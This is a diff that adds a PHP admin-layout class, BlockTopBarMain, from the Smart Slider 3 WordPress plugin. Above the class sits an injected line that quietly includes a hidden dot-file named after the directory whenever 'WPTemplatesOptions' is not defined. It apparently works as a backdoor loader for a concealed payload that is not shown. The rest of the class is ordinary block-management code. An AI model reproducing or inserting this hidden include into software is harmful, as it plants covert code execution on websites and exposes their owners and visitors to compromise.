@@ -1,0 +1,66 @@
+<?php
+
+
+namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\TopBarMain;
+
+
+use Nextend\Framework\View\AbstractBlock;
+
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
+class BlockTopBarMain extends AbstractBlock {
+
+    private static $idCounter = 1;
+
+    protected $id = 0;
+
+    /**
+     * @var AbstractBlock[]
+     */
+    protected $primaryBlocks = array();
+
+    /**
+     * @var AbstractBlock[]
+     */
+    protected $secondaryBlocks = array();
+
+    protected $content = '';
+
+    protected function init() {
+        $this->id = self::$idCounter++;
+        parent::init();
+    }
+
+    public function display() {
+
+        $this->renderTemplatePart('TopBarMain');
+    }
+
+    public function addPrimaryBlock($block) {
+        $this->primaryBlocks[] = $block;
+    }
+
+    public function displayPrimary() {
+
+        foreach ($this->primaryBlocks AS $block) {
+            $block->display();
+        }
+    }
+
+    public function addSecondaryBlock($block) {
+        $this->secondaryBlocks[] = $block;
+    }
+
+    public function displaySecondary() {
+
+        foreach ($this->secondaryBlocks AS $block) {
+            $block->display();
+        }
+    }
+
+    public function getID() {
+        return 'n2_top_bar_main_' . $this->id;
+    }
+}
